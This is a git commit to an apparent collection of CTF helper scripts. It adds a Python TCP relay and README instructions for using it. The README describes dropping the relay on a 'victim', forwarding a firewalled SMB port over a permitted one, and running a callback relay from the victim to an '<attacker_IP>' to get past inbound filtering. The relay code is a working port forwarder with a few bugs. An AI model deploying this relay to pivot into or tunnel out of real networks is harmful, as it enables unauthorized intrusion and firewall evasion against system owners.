77581953774dc8c30b68cfcb5f8153d721d0a816
hullet <hullet@ling.local>
2020-05-14 13:46:40 +0100

    Added TCP relay

--- README.md
+++ README.md
@@ -1,10 +1,48 @@
 # python_widgets
 A collection of small helper scripts I've used during CTF challenges; all scripts are made with the quick-and-dirty principle, but that doesn't mean they're not useful!
 
-More to follow in time.
+All scripts written for Python 3. More to follow in time.
+
+## Requirements
+
+All requirements have been rolled into one requirements file, to get up and running for all tools:
+
+```
+~$ python -m pip install -r requirements.txt
+```
+
+Then go!
 
 ## rot_hunter
 
 This is the first tool I've published so far and is somehting I use when feeling too lazy to try different rot encodings during CTFs. This tool takes two files as command line arguments, one containing your ciphertext, one containing a dictinary of valid words; the tool will find the most likely rot key and allow you to parse all other options in decreasing order of confidence the solution is good.
 
 I've inluded a couple of test files for your enjoyment; check out the file header or usage info and get started!
+
+## TCP Relay
+
+This tool is a (slightly) simpler version of a netcat relay, without netcat, trickery, magic etc. Just drop the relay on your target and start forwarding TCP ports. 
+
+You should compile your own binary for your systems if you can, but a copy is included in the repo for speediness.
+
+### Examples
+
+To forward a firewalled port (say 445 in this example), over a permitted port (5555), run:
+
+```
+C:\> relay.exe -c 127.0.0.1 445 -l 5555
+```
+
+And you'll be able to connect straight up to the victim port 5555 to get SMB access; similarly, if all inbound is filetered, you could run a call back relay. On your attacker:
+
+```
+attacker@attacker ~$ relay.py -l 4444 -l 9999 -v -t
+```
+
+This will set up a loacl relay to catch the callback and serve relay traffic to port 9999; the v and t tags make the tool vun verbosely and tee all data to the console respectively. Now execute a callback relay from the victim:
+
+``` 
+C:\relay.exe -c 127.0.0.1 445 -c <attacker_IP> 4444
+```
+
+Now you'll be able to access SMB from your **attacker** machine, port 9999. Enjoy!
---
+++ tcp_relay/relay.py
@@ -0,0 +1,212 @@
+#!/usr/bin/env/ python3
+import sys
+import socket
+import threading
+import argparse
+import queue
+
+from time import sleep
+from hexdump import hexdump
+
+def get_args():
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-l', '--listen', action='append', nargs='+', help='Listen on a given port. Format -l <port>')
+    parser.add_argument('-c', '--connect', action='append', nargs='+', help='Connect to a given host & port. Format : -c <host> <port>')
+    parser.add_argument('-t', '--tee', action='store_true', help='Also print all traffic on Stdout.')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Print more stuff during execution.')
+    args = parser.parse_args()
+
+    #Count how many connections have been provided
+    conns = len(args.listen) if args.listen else 0
+    conns = conns + len(args.connect) if args.connect else conns 
+
+    if conns != 2:
+        print("")
+        print("[!] - Incorrect number of relay endpoints. You must specify two endpoints to relay.")
+        print("\tYou can specify either two local ports, two ports to connect remote, or one local one remote.\n")
+        print("Example - relay local listener on port 4444 to local connection to port 445:")
+        print("\t{} -l 4444 -c 127.0.0.1 445\n".format(sys.argv[0]))
+        print("Example - relay local listener on port 4444 to local listener on port 445:")
+        print("\t{} -l 4444 -l 445\n".format(sys.argv[0]))
+        print("Example - relay connection to remote server (10.10.10.10) port 5555 to local connection to port 445:")
+        print("\t{} -c 10.10.10.10 5555 -c 127.0.0.1 445\n".format(sys.argv[0]))
+        parser.print_help()
+        sys.exit(0)
+
+    bind1 = args.listen[0] if args.listen else None
+    bind2 = args.listen[1] if (args.listen and len(args.listen) > 1) else None
+    connect1 = args.connect[0] if args.connect else None
+    connect2 = args.connect[1] if (args.connect and len(args.connect) > 1) else None
+
+    #Format bind and conenct parameters into socket compatible tuples
+    try:
+        bind1 = ("0.0.0.0", int(bind1[0])) if bind1 else None
+        bind2 = ("0.0.0.0", int(bind2[0])) if bind2 else None
+        connect1 = (str(connect1[0]), int(connect1[1])) if connect1 else None
+        connect2 = (str(connect2[0]), int(connect2[1])) if connect2 else None
+    except Exception as e:
+        print("")
+        print("[!] - Error converting arguments:\n\t{}".format(e))
+        print("\tAre your ports and IP addresses formatted correctly?\n")
+        parser.print_help()
+        sys.exit(0)
+
+    print("bind1 : {}, bind2 : {}, connect1 : {}, connect 2 : {}".format(bind1, bind2, connect1, connect2))
+
+    if bind1 and bind2:
+        if args.verbose:
+            print("[+] - Relay combo good - bind to bind")
+    elif connect1 and connect2:
+        if args.verbose:
+            print("[+] - Relay combo good - connect to connect")
+    elif connect1 and bind1:
+        if args.verbose:
+            print("[+] - Relay Combo good - bind to connect")
+    else:
+        print("[!] - Bad relay combo!")
+        sys.exit(0)
+
+    return bind1, bind2, connect1, connect2, args.verbose, args.tee
+
+def recv_from(connection):
+    connection.settimeout(1)
+    try:
+        buffer = b""
+        while True:
+            data = connection.recv(4096)
+            if not data:
+                break
+            buffer += data
+    except socket.timeout as e:
+        pass
+    except Exception as e:
+            print("[!] - Exception while receiving : {}".format(e))
+    return buffer
+
+def connect_relay(host, q_in, q_out, tee, kill):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(0.5)
+    while True:
+        try:
+            if kill.is_set():
+                print("[!] - Killing connection to {}".format(host))
+                s.shutdown(socket.SHUT_RD)
+                s.close()
+            s.connect(host)
+            break
+        except socket.timeout:
+            pass
+        except Exception as e:
+            print("[!!] - Can't connect to {}: {}".format(host, e))
+            kill.set()
+            return
+    print("[+] - Connected to {}".format(host))
+    while True:
+        if kill.is_set():
+            print("[!] - Killing connection to {}".format(host))
+            s.shutdown(socket.SHUT_RD)
+            s.close()
+            return
+	#if we got data on the sister socket, send that first
+        if not q_in.empty():
+            to_send = q_in.get()
+            s.sendall(to_send)
+	#Then receive data and give to sister
+        recv_data = recv_from(s)
+        if tee and recv_data:
+            print("---- FROM {} ----".format(host))
+            hexdump(recv_data)
+        q_out.put(recv_data)
+
+def bind_relay(host, q_in, q_out, tee, kill):
+    try:
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            server.bind(host)
+        except Exception as e:
+            print("[!!] - Can't bind on {}: {}".format(host, e))
+            sys.exit(0)
+        print("[+] - Listening on {}".format(host))
+        server.listen(0)
+        server.settimeout(0.5)
+        while True:
+            try:
+                if kill.is_set():
+                    print("[!] - Killing listener on {}".format(host))
+                    server.shutdown(socket.SHUT_RD)
+                    server.close()
+                    return
+                clnt_sock, addr = server.accept()
+                break
+            except socket.timeout:
+                pass
+            except Exception as e:
+                print("[!] - Exception accepting connections : {}".format(e))
+        print("[+] - Connection received from {}".format(addr))
+        while True:
+            if kill.is_set():
+                print("[!] - Killing listener on {}".format(host))
+                server.shutdown(socket.SHUT_RD)
+                server.close()
+                return
+            #if we got data on the sister socket, send that first
+            if not q_in.empty():
+                to_send = q_in.get()
+                clnt_sock.sendall(to_send)
+            #Then receive data and give to sister
+            recv_data = recv_from(clnt_sock)
+            if tee and recv_data:
+                print("---- FROM {} ----".format(addr))
+                hexdump(recv_data)
+            q_out.put(recv_data)
+    except Exception as e:
+        print("\n[!] - Exception in bind relay thread : {}".format(e))
+        kill_flag.set()
+        sleep(1)
+        return
+
+
+def main():
+    #Setup queue data structures for relayed data
+    q_1_2 = queue.Queue()
+    q_2_1 = queue.Queue()
+    kill_flag = threading.Event()
+    
+    #Get args
+    bind1, bind2, conn1, conn2, v, t = get_args()
+    
+    #Setup relay
+    if bind1 and bind2:
+        host1 = threading.Thread(target=bind_relay, args=(bind1, q_2_1, q_1_2, t, kill_flag))
+        host2 = threading.Thread(target=bind_relay, args=(bind2, q_1_2, q_2_1, t, kill_flag))
+    elif conn1 and conn2:
+        host1 = threading.Thread(target=connect_relay, args=(conn1, q_2_1, q_1_2, t, kill_flag))
+        host2 = threading.Thread(target=connect_relay, args=(conn2, q_1_2, q_2_1, t, kill_flag))
+    else:
+        host1 = threading.Thread(target=bind_relay, args=(bind1, q_2_1, q_1_2, t, kill_flag))
+        host2 = threading.Thread(target=connect_relay, args=(conn1, q_1_2, q_2_1, t, kill_flag))
+    try:
+        #Start relay
+        host1.daemon=True
+        host2.deamon=True
+        host1.start()
+        host2.start()
+        while True:
+            if kill_flag.is_set():
+                #We've been told to die by another thread.
+                print("[!] - Terminating relays. Please wait.")
+                sleep(3)
+                sys.exit(0)
+            sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] - Interrupted - please wait.")
+        kill_flag.set()
+        sleep(3)
+        sys.exit()
+    except Exception as e:
+        print("Exception in main : {}".format(e))
+        sys.exit(0)
+
+if __name__ == '__main__':
+    main()
